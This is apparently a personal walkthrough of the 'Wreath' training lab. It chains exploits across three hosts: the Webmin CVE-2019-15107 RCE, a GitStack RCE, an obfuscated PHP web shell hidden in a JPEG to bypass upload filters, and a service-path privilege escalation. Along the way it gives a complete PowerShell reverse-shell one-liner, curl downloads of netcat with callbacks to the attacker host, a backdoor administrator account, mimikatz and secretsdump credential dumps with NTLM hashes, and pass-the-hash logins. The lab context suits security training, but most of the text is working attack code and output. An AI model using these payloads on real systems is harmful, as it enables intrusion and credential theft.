# Wreath

## Webserver 

### Enumeration

#### nmap

Scan all the port 

```bash
kali㉿kali-[~/thm/wreath]$ nmap -p-15000 10.200.186.200                                       

Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 13:16 CEST
Stats: 0:09:25 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 91.96% done; ETC: 13:26 (0:00:49 remaining)
Nmap scan report for 10.200.186.200
Host is up (0.74s latency).
Not shown: 14995 filtered ports
PORT      STATE  SERVICE
22/tcp    open   ssh
80/tcp    open   http
443/tcp   open   https
9090/tcp  closed zeus-admin
10000/tcp open   snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 610.25 seconds
```

Service scan on the open port.

```bash
kali㉿kali-[~/thm/wreath]$ nmap -sC -sV -p 22,80,433,9090,10000 10.200.186.200                

Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-02 13:32 CEST
Nmap scan report for thomaswreath.thm (10.200.186.200)
Host is up (0.094s latency).

PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open     http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
433/tcp   filtered nnsp
9090/tcp  closed   zeus-admin
10000/tcp open     http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds
```

#### config

adding the host to /etc/hosts
10.200.186.200	thomaswreath.thm
 
MiniServ 1.890 (Webmin httpd) appear to be vulnerable to an unauthenticated remote code execution (RCE) exploit - CVE-2019-15107

### Exploitation

Cloning the repository

```bash
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 && pip3 install -r requirements.txt
```

```bash
kali㉿kali-[~/thm/wreath/CVE-2019-15107]$ python3 CVE-2019-15107.py 10.200.186.200                                  1 ⨯

        __        __   _               _         ____   ____ _____
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|

                                                @MuirlandOracle


[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.186.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
```

We got a pseudoshell on `10.200.186.200` as root.  The machine have perl preinstalled so we can use it to stabilizing the shell

```bash
$ perl -e "exec '/bin/bash';"
```

Then download ssh priv key to get remote access to the machine.


## Gitserver

### Enumeration

We can download static nmap binary and upload it to the compromised machine

```bash
kali㉿kali-[~/thm/wreath]$ scp -i id_rsa nmap_exil root@10.200.186.200:~/                                   130 ⨯ 1 ⚙
nmap_exil                                                                           100% 3007KB 988.4KB/s   00:03
```

then scan the network with nmap, -sn switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.

#### namp

```bash
[root@prod-serv ~]# ./nmap_exil -sn 10.200.186.1-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-10-02 14:24 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-186-1.eu-west-1.compute.internal (10.200.186.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00043s latency).
MAC Address: 02:1C:FD:8B:97:2D (Unknown)
Nmap scan report for ip-10-200-186-100.eu-west-1.compute.internal (10.200.186.100)
Host is up (0.00015s latency).
MAC Address: 02:48:38:88:BE:55 (Unknown)
Nmap scan report for ip-10-200-186-150.eu-west-1.compute.internal (10.200.186.150)
Host is up (-0.10s latency).
MAC Address: 02:1C:27:88:B0:9B (Unknown)
Nmap scan report for ip-10-200-186-250.eu-west-1.compute.internal (10.200.186.250)
Host is up (0.00045s latency).
MAC Address: 02:B0:EA:E0:AB:7B (Unknown)
Nmap scan report for ip-10-200-186-200.eu-west-1.compute.internal (10.200.186.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.73 seconds
```

All `10.200.186.100` are filtred

Scanning `10.200.186.150`

```bash
[root@prod-serv ~]# ./nmap_exil 10.200.186.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-10-02 14:32 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-186-150.eu-west-1.compute.internal (10.200.186.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00048s latency).
Not shown: 6147 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 02:1C:27:88:B0:9B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 103.29 seconds
```

#### sshutle

```bash
kali㉿kali-[~/thm/wreath]$ sshuttle -r root@10.200.186.200 --ssh-cmd "ssh -i id_rsa" 10.200.186.0/24 -x 10.200.186.200
```

#### SSH local port forwarding

Using port forwarding we can access the web server which host `Gitstack` application

```bash
kali㉿kali-[~/thm/wreath]$ ssh -L 8080:localhost:80 -i id_rsa root@10.200.186.200 -fN
```

#### SSH dynamic port forwarding / proxychains

or using dynamic port forwarding with proxychains or foxypoxy.

dynamic port forwarding

```bash
kali㉿kali-[~/thm/wreath]$ ssh -D 1337 -i id_rsa root@10.200.186.200 -fN
```

proxychains

```bash
socks4	127.0.0.1 1337
```

searching in exploit-db we found that the application is vulnerable to (RCE)

```
kali㉿kali-[~]$ searchsploit gitstack
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                      | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                    | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                               | php/webapps/43777.py
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I then copied the exploit file and adapt it to run pseudoshell

```python
print "[+] Pseudoshell "
while True:
    r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : raw_input("$ ")})
    print r.text.encode(sys.stdout.encoding, errors='replace')
```

### Exploitation

Running the exploit

```bash
kali㉿kali-[~/thm/wreath]$ ./exploit.py                                                                             1 ⨯
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work.
[+] Pseudoshell
$ whoami
"nt authority\system
"
```

The second maching cannot ping the outside world so we need to setup a relay on the first machine to get a reverseshell

In order to get reverse shell, we need to open port on relay machine and use ssh reverse port forwarding, we should also set GatewayPorts to yes on sshd config.

```bash
[root@prod-serv ~]# firewall-cmd --zone=public --add-port=1337/tcp
success
[root@prod-serv ~]# firewall-cmd --reload
success
```

```bash
[root@prod-serv ~]# vim /etc/ssh/sshd_config
GatewayPorts yes
```
 
```bash
kali㉿kali-[~/thm/wreath]$ ssh -R 1337:localhost:1337 -i id_rsa root@10.200.186.200 -nf
```

then we used the exploit through proxychains to run powershell and setup reverseshell

```batch

powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.186.200',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```bash
nc -nlvp 1339                                            1 ⨯
listening on [any] 1339 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 33088
PS C:\GitStack\gitphp>
```

### Stabilisation & Post exploitation

Create a windows account in order to access through RDP or WinRM

```batch
PS C:\GitStack\gitphp> net user admin admin /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators admin /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" admin /add
The command completed successfully.

PS C:\GitStack\gitphp> net user admin
User name                    admin
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            03/10/2021 18:33:21
Password expires             Never
Password changeable          03/10/2021 18:33:21
Password required            Yes
User may change password     Yes
```

Access via WinRM

```bash
proxychains -q evil-winrm -u admin -p admin -i 10.200.186.150
```

Access via RDP

```bash
proxychains -q xfreerdp /v:10.200.186.150 /u:admin /p:admin /drive:.,kali 
```

#### Dump passwords

We can dump passwords using mimikatz as admin

```batch
C:\Windows\system32>\\tsclient\kali\mimikatz\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

668     {0;000003e7} 1 D 20143          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)
Primary
 -> Impersonated !
 * Process Token : {0;0005cc44} 2 F 713124      GIT-SERV\admin  S-1-5-21-3335744492-1614955177-2693036043-1002  (15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 763513      NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

SAMKey : f4a3c96f8149df966517ec3554632cf4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 68b1608793104cca229de9f1dfb6fbae

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-1696O63F791Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f7590c29ffc78998884823b1abbc05e6102a6e86a3ada9040e4f3dcb1a02955
      aes128_hmac       (4096) : 503dd1f25a0baa75791854a6cfbcd402
      des_cbc_md5       (4096) : e3915234101c6b75

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-1696O63F791Administrator
    Credentials
      des_cbc_md5       : e3915234101c6b75


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c70854ba88fb4a9c56111facebdf3c36

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e389f51da73551518c3c2096c0720233

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1d916df8ca449782c73dbaeaa060e0785364cf17c18c7ff6c739ceb1d7fdf899
      aes128_hmac       (4096) : 33ee2dbd44efec4add81815442085ffb
      des_cbc_md5       (4096) : b6f1bac2346d9e2c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : b6f1bac2346d9e2c


RID  : 000003e9 (1001)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03126107c740a83797806c207553cef7

* Primary:Kerberos-Newer-Keys *
    Default Salt : GIT-SERVThomas
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 19e69e20a0be21ca1befdc0556b97733c6ac74292ab3be93515786d679de97fe
      aes128_hmac       (4096) : 1fa6575936e4baef3b69cd52ba16cc69
      des_cbc_md5       (4096) : e5add55e76751fbc
    OldCredentials
      aes256_hmac       (4096) : 9310bacdfd5d7d5a066adbb4b39bc8ad59134c3b6160d8cd0f6e89bec71d05d2
      aes128_hmac       (4096) : 959e87d2ba63409b31693e8c6d34eb55
      des_cbc_md5       (4096) : 7f16a47cef890b3b

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : GIT-SERVThomas
    Credentials
      des_cbc_md5       : e5add55e76751fbc
    OldCredentials
      des_cbc_md5       : 7f16a47cef890b3b


RID  : 000003ea (1002)
User : admin
  Hash NTLM: 209c6174da490caeb422f3fa5a7ae634

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9ff900509eb4398f66ff3d8a29500267
```

Thomas password is `i<3ruby`

To use evil-winrm with administrator hash

```bash
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150
```

## Personal PC

### Enumeration

Scanning `10.200.186.100` ports using evil-winrm with empire scripts `Invoke-Portscan`

```bash
kali㉿kali-[~/thm/wreath]$ evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/                                                
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.186.100 -TopPorts 50


Hostname      : 10.200.186.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 110, 21...}
finishTime    : 10/4/2021 10:18:49 AM
```

### Pivoting 

using xfreerdp we open a port 1337 on `10.200.186.100` and we run chisel froward proxy

```batch
C:\Windows\system32>netsh advfirewall firewall add rule name="elite" dir=in action=allow protocol=tcp localport=1337
Ok.

C:\Windows\system32>\\tsclient\kali\chisel.exe server -p 1337 --socks5
2021/10/04 10:44:26 server: Fingerprint nlNxYDUfQIWr6tuoMggLSdV7w62hcPlchYb8B6bhiSk=
2021/10/04 10:44:26 server: Listening on http://0.0.0.0:1337
```

```bash
kali㉿kali-[~/thm/wreath]$ ./chisel client 10.200.186.150:1337 1337:socks     130 ⨯
2021/10/04 11:44:07 client: Connecting to ws://10.200.186.150:1337
2021/10/04 11:44:07 client: tun: proxy#127.0.0.1:1337=>socks: Listening
2021/10/04 11:44:43 client: Connected (Latency 1.35310808s)
```

Now we can access the http server using foxyproxy

The website seems to be a copy of the running on the webserver

The gitserver is located on `C:\GitStack\repositories\website.git`, using evil-winrm we can download it

```bash
*Evil-WinRM* PS C:\GitStack\repositories> download C:\Gitstack\Repositories\Website.git
Info: Downloading C:\Gitstack\Repositories\Website.git to .git


Info: Download successful!
```

extract the commits from .git

```bash
kali㉿kali-[~/thm/wreath]$ GitTools/Extractor/extractor.sh . Website
```

### Code analysis

By analysing the `/resources/index.php` code we found :

* Uploaded files are located underi `/resources/uploads`
* There are two file upload filters in play (size, extension)
* Both filters are bypassable

### Exploit POC

Uploading php obfuscated file to execute remote command using [PHP Obfuscator](https://www.gaijin.at/en/tools/php-obfuscato)

Obfuscating with string encoding and hexadecimal value for names

```php
<?php
    $cmd = $_GET["cmd"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

into 

```php
<?php $q0=$_GET[base64_decode('Y21k')];if(isset($q0)){echo base64_decode('PHByZT4=').shell_exec($q0).base64_decode('PC9wcmU+');}die();?>
```

We can execute command using the cmd GET param. we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen. 

We can then add comment to a jpeg image using exiftool to bypass the `size()` filter

```bash
exiftool -Comment="<?php \$q0=\$_GET[base64_decode('Y21k')];if(isset(\$q0)){echo base64_decode('PHByZT4=').shell_exec(\$q0).base64_decode('PC9wcmU+');}die();?>" kaido-shell.jpeg.php
```

### Compiling Netcat & Reverse Shell!

we can clone netcat github project and compile it with mingw-64 to be executable on windows

then we set up a python http server and download netcut to the machine in order to get reverse shell using the url `http://10.200.186.100/resources/uploads/shell-kaido.jpeg.php?cmd=curl http://10.50.183.4/nc64.exe -o c:\\windows\\temp\\nc64.exe`

```bash
sudo python3 -m http.server 80                                                                                                      1 ⨯
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.186.100 - - [04/Oct/2021 13:41:36] code 404, message File not found
10.200.186.100 - - [04/Oct/2021 13:41:36] "GET /nc-64.exe HTTP/1.1" 404 -
10.200.186.100 - - [04/Oct/2021 13:42:04] "GET /nc64.exe HTTP/1.1" 200 -
```

then we run net cut using the url `http://10.200.186.100/resources/uploads/shell-kaido.jpeg.php?cmd=powershell.exe c:\\windows\\temp\\nc64.exe 10.50.183.4 1339 -e cmd.exe
`

```bash
kali㉿kali-[~/thm/wreath/nc.exe]$ nc -nlvp 1339
listening on [any] 1339 ...
connect to [10.50.183.4] from (UNKNOWN) [10.200.186.100] 50725
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\resources\uploads>
```

### Enumeration

```bash
C:\xampp\htdocs\resources\uploads>whoami
whoami
wreath-pc\thomas

C:\xampp\htdocs\resources\uploads>hostname
hostname
wreath-pc

C:\xampp\htdocs\resources\uploads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\xampp\htdocs\resources\uploads>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

It's unlikely that a core windows service is vulnerable, so let's start looking for non-default services, by listing all the services on the system and filtring so that only services that are not in `C:/Windows`

```bash
C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
DisplayName                                                                         Name                                      PathName                                                                                    StartMode
Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto
Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto
AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto
LSM                                                                                 LSM                                                                                                                                   Unknown
Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual
NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown
Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto
Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual
Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto
Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual
```

```batch
C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
sc qc SystemExplorerHelpService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

```batch
C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"


Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)
```

```C#
using System;
using System.Diagnostics;

namespace Wrapper{
    public class Program{
        public static void Main(){
            Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc64.exe", "10.50.183.4 1338 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
        }
    }
}
```

compiling our code and upload it using curl, then execute it to get a revese shell with root access

```bash
mcs Wrapper.cs
```

```batch
C:\xampp\htdocs\resources\uploads>curl http://10.50.183.4/Wrapper.exe -o  "C:\Program Files (x86)\System Explorer\System.exe"
curl http://10.50.183.4/System.exe -o  "C:\Program Files (x86)\System Explorer\System.exe"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3584  100  3584    0     0   3584      0  0:00:01 --:--:--  0:00:01 25600

C:\xampp\htdocs\resources\uploads>dir "C:\Program Files (x86)\System Explorer\"
dir "C:\Program Files (x86)\System Explorer\"
 Volume in drive C has no label.
 Volume Serial Number is A041-2802

 Directory of C:\Program Files (x86)\System Explorer

04/10/2021  14:34    <DIR>          .
04/10/2021  14:34    <DIR>          ..
22/12/2020  00:55    <DIR>          System Explorer
04/10/2021  14:34             3,584 System.exe
               1 File(s)          3,584 bytes
               3 Dir(s)   6,987,202,560 bytes free

C:\xampp\htdocs\resources\uploads>sc stop SystemExplorerHelpService
sc stop SystemExplorerHelpService

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x1388

C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
sc start SystemExplorerHelpService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
We got a shot as admin and we will copy the password hashes to uploads directory and download it on attacking machine to extract the hashes

```bash
kali㉿kali-[~/thm/wreath]$ nc -nlvp 1338                                         1 ⨯
listening on [any] 1338 ...
connect to [10.50.183.4] from (UNKNOWN) [10.200.186.100] 51399
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>reg.exe save HKLM\SAM reg.exe save HKLM\SYSTEM C:\xampp\htdocs\resources\uploads\sam

reg.exe save HKLM\SAM C:\xampp\htdocs\resources\uploads\sam
The operation completed successfully.

C:\Windows\system32>
C:\Windows\system32>reg.exe save HKLM\SYSTEM C:\xampp\htdocs\resources\uploads\system

reg.exe save HKLM\SYSTEM C:\xampp\htdocs\resources\uploads\system
The operation completed successfully.
```

```bash
kali㉿kali-[~/thm/wreath]$ python3 /opt/impacket/examples/secretsdump.py -sam sam -system system LOCAL
Impacket v0.9.24.dev1+20210928.152630.ff7c521a - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```
